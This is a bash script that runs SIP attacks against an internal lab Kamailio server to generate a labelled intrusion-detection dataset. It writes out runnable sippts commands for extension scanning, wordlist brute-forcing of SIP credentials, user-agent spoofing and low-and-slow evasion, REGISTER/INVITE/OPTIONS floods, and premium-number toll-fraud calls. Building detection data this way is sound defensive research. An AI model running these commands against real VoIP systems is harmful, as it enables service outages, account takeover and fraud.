#!/usr/bin/env bash
# Parametric attack matrix generator for the NGN SIP testbed.
#
# Generates a labeled dataset by running the real attack tools across the 6
# attack classes with controlled variation in RATE, EVASION technique, and
# SOURCE IP. Each run uses a fresh attacker container (distinct sip_lab IP) and
# emits one ground-truth attack_labels row via label_emitter.py, tagged with the
# attack_id, MITRE technique, phase, and a notes field encoding the variant.
#
# This is NOT "50 different attacks": there are 6 SIP attack classes. It is ~50
# labeled RUNS that vary parameters so the dataset has separation for the ML and
# an evasion axis for robustness evaluation. All traffic targets the lab edge
# (kamailio) on the internal sip_lab network. Internal validity only; external
# validity requires the public-exposure phase (documented as a limitation).
#
# Usage (on the VM, in the repo root):
#   bash attacks/orchestrator/attack_matrix.sh [REPEATS]
# REPEATS (default 1) multiplies each variant for more samples.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1   # repo root
REPEATS="${1:-1}"
IMAGE="ngn-sip/attacker:v1"
NET="ngn-sip_sip_lab"
TARGET="${TARGET_HOST:-kamailio}"
TPORT="${TARGET_PORT:-5060}"
WORDLIST="/work/attacks/02_credentials/wordlists/short.txt"
P="$(grep ^CLICKHOUSE_PASSWORD= .env | cut -d= -f2-)"
ch() { printf '%s' "$1" | curl -s "http://127.0.0.1:8123/?user=ngn&password=${P}" --data-binary @- ; }

RUN=0
# Assign each attacker run a STATIC IP from a reserved range (172.18.200.0/24)
# so every run has a genuinely distinct, persistent source IP. Docker recycles
# auto-assigned IPs after teardown, which would collapse all runs onto one IP
# and destroy the source-variation dimension and the per-src_ip feature labels.
start_attacker() {  # name run_index -> starts container with a unique static IP, echoes IP
  local n="$1" idx="${2:-1}"
  docker rm -f "$n" >/dev/null 2>&1 || true
  # Derive a unique octet from the GLOBAL run index passed in. The previous
  # version incremented a variable inside this function, but start_attacker is
  # called via command substitution $(...) which runs in a subshell, so the
  # increment was lost and every run got the same IP (.11). Passing $RUN fixes it.
  local octet=$(( (idx % 240) + 11 ))
  local ip="172.18.200.${octet}"
  docker run -d --name "$n" --network "$NET" --ip "$ip" \
    -v "$(pwd)/attacks:/work/attacks:ro" --entrypoint sleep "$IMAGE" 900 >/dev/null 2>&1 \
    || docker run -d --name "$n" --network "$NET" \
         -v "$(pwd)/attacks:/work/attacks:ro" --entrypoint sleep "$IMAGE" 900 >/dev/null
  docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$n"
}
stop_attacker() { docker rm -f "$1" >/dev/null 2>&1 || true; }
label() {  # ctr ip attack_id mitre phase notes
  docker exec -e CLICKHOUSE_HOST=clickhouse -e CLICKHOUSE_PASSWORD="${P}" -e PYTHONPATH=/work \
    "$1" python3 /work/attacks/orchestrator/label_emitter.py "$2" "$3" "$4" "$5" "$6" >/dev/null 2>&1 || true
}

# Generic runner: name, attack_id, mitre, phase, notes, and the in-container cmd.
do_run() {
  local tag="$1" aid="$2" mitre="$3" phase="$4" notes="$5"; shift 5
  RUN=$((RUN+1))
  local ctr="atk_${tag}_${RUN}"
  local ip; ip="$(start_attacker "$ctr" "$RUN")"
  printf '[%02d] %-22s %-10s rate/evasion=%-22s ip=%s\n' "$RUN" "$aid" "$phase" "$notes" "$ip"
  docker exec "$ctr" sh -lc "$*" >/dev/null 2>&1 || true
  label "$ctr" "$ip" "$aid" "$mitre" "$phase" "$notes"
  stop_attacker "$ctr"
}

echo "===================================================================="
echo " NGN SIP attack matrix | repeats=${REPEATS} | target=${TARGET}:${TPORT}"
echo " labels before: $(ch 'SELECT count() FROM ngn_sip.attack_labels')"
echo "===================================================================="

for rep in $(seq 1 "$REPEATS"); do
  # ============================================================ RECON (T1595)
  do_run recon sippts_scan_fast        T1595 recon "scan_fast"            \
    "sippts scan -i $TARGET -r $TPORT -p udp -th 10"
  do_run recon sippts_scan_slow        T1595 recon "scan_slow_evasion"   \
    "sippts scan -i $TARGET -r $TPORT -p udp -th 1"
  do_run recon sippts_exten_sweep      T1595 recon "exten_sweep_100_200" \
    "sippts exten -i $TARGET -r $TPORT -e 100-200 -p udp -th 5"
  do_run recon sippts_exten_uaspoof    T1595 recon "exten_ua_spoofed"    \
    "sippts exten -i $TARGET -r $TPORT -e 100-150 -p udp -ua 'Asterisk PBX'"

  # ====================================================== CREDENTIALS (T1110)
  do_run cred sippts_rcrack_fast       T1110.001 credentials "brute_fast_th10" \
    "sippts rcrack -i $TARGET -r $TPORT -e 1000 -w $WORDLIST -p udp -th 10"
  do_run cred sippts_rcrack_slow       T1110.001 credentials "brute_lowandslow" \
    "sippts rcrack -i $TARGET -r $TPORT -e 1000 -w $WORDLIST -p udp -th 1"
  do_run cred sippts_rcrack_uaspoof    T1110.001 credentials "brute_ua_spoofed" \
    "sippts rcrack -i $TARGET -r $TPORT -e 1000 -w $WORDLIST -p udp -ua 'Zoiper'"
  do_run cred sippts_rcrack_multiext   T1110.001 credentials "brute_multi_exten" \
    "sippts rcrack -i $TARGET -r $TPORT -e 1000,1001,1002 -w $WORDLIST -p udp -th 5"

  # ============================================================== DOS (T1499)
  # Floods via bounded `sippts flood` (SIPp is NOT installed in the attacker
  # image - the previous /usr/local/bin/sipp path failed silently, so the dos
  # class generated no traffic at all). sippts flood sends from the container's
  # static IP, so PIKE attributes the flood to the labelled source; `timeout`
  # bounds each run (sippts flood is otherwise unbounded). Vary method and spoof
  # the UA on some runs so detection exercises both the rate-based PIKE rule
  # (100103) and, on default-UA runs, the IOC scanner rule.
  do_run dos sippts_register_flood        T1499 dos "register_flood"          \
    "timeout 10 sippts flood -i $TARGET -r $TPORT -p udp -m register 2>/dev/null || true"
  do_run dos sippts_invite_flood_uaspoof  T1499 dos "invite_flood_uaspoof"    \
    "timeout 10 sippts flood -i $TARGET -r $TPORT -p udp -m invite -ua 'PolycomVVX-VVX_411' 2>/dev/null || true"
  do_run dos sippts_options_flood         T1499 dos "options_flood"           \
    "timeout 10 sippts flood -i $TARGET -r $TPORT -p udp -m options 2>/dev/null || true"
  do_run dos sippts_register_flood_uaspoof T1499 dos "register_flood_uaspoof" \
    "timeout 10 sippts flood -i $TARGET -r $TPORT -p udp -m register -ua 'Zoiper rv2.10.4.0' 2>/dev/null || true"

  # ======================================================== INJECTION (T1190)
  # sippts send with a single crafted INVITE (bounded by design, no flood).
  do_run inj sippts_invite_malformed   T1190 injection "malformed_invite" \
    "timeout 15 sippts send -i $TARGET -r $TPORT -p udp -m INVITE 2>/dev/null || true"

  # ======================================================= TOLLFRAUD (T1496)
  do_run toll sippts_invite_premium    T1496 tollfraud "premium_prefix" \
    "timeout 15 sippts invite -i $TARGET -r $TPORT -p udp -tu '+19001234567' 2>/dev/null || timeout 15 sippts send -i $TARGET -r $TPORT -p udp -m INVITE 2>/dev/null || true"

  # ============================================================== BENIGN (negative class)
  # Run legitimate SIP traffic from the attacker image (it has SIPp + the
  # label_emitter deps and supports a static --ip), so benign rows are labelled
  # the same reliable way as attacks. A real negative class is REQUIRED for any
  # detection metric (precision needs a false-positive denominator). Benign uses
  # a separate IP block (172.18.201.x) so it never collides with attacker IPs.
  for v in 1 2 3 4; do
    RUN=$((RUN+1))
    bn="benign_${rep}_${v}"
    bip="172.18.201.$(( (RUN % 240) + 11 ))"
    docker rm -f "$bn" >/dev/null 2>&1 || true
    docker run -d --name "$bn" --network "$NET" --ip "$bip" \
      -v "$(pwd)/attacks:/work/attacks:ro" --entrypoint sleep "$IMAGE" 300 >/dev/null 2>&1 \
      || { docker run -d --name "$bn" --network "$NET" -v "$(pwd)/attacks:/work/attacks:ro" --entrypoint sleep "$IMAGE" 300 >/dev/null; bip="$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$bn")"; }
    u="$(awk -F';' 'NR==2{print $1}' infra/sipp/data/ua1000.csv)"; pw="$(awk -F';' 'NR==2{print $2}' infra/sipp/data/ua1000.csv)"
    printf '[%02d] %-22s %-10s %-22s ip=%s\n' "$RUN" "benign_options" "benign" "low_rate_keepalive" "$bip"
    # Benign = a low-rate, single-target OPTIONS keepalive (what a legitimate
    # monitored UA does), using the same sippts path that reliably produces
    # parseable sip_events. The attack-vs-benign signal is therefore RATE and
    # VOLUME (a few low-rate OPTIONS vs a high-rate sweep/flood), which is the
    # realistic, learnable distinction. Using -sn uac (INVITE) failed silently
    # because no UAS answers, so no SIP was logged - that was the earlier bug.
    docker exec "$bn" sh -lc "timeout 12 sippts ping -i ${TARGET} -r ${TPORT} -p udp 2>/dev/null || timeout 12 sippts scan -i ${TARGET} -r ${TPORT} -p udp -th 1 2>/dev/null || true" >/dev/null 2>&1 || true
    label "$bn" "$bip" "benign_options" "none" "benign" "low_rate_keepalive"
    docker rm -f "$bn" >/dev/null 2>&1 || true
  done
done

echo "==> wait for Vector flush + MV aggregation"
sleep 20

echo ""
echo "===================================================================="
echo " RESULTS"
echo "===================================================================="
echo "total runs:        ${RUN}"
echo "sip_events:        $(ch 'SELECT count() FROM ngn_sip.sip_events')"
echo "sip_features_5min: $(ch 'SELECT count() FROM ngn_sip.sip_features_5min')"
echo "attack_labels:     $(ch 'SELECT count() FROM ngn_sip.attack_labels')"
echo "--- labels by phase ---"
ch "SELECT phase, count() FROM ngn_sip.attack_labels GROUP BY phase ORDER BY count() DESC FORMAT TSV"
echo "--- labels by attack_id ---"
ch "SELECT attack_id, count() FROM ngn_sip.attack_labels GROUP BY attack_id ORDER BY count() DESC FORMAT TSV"
echo "ATTACK_MATRIX_DONE"
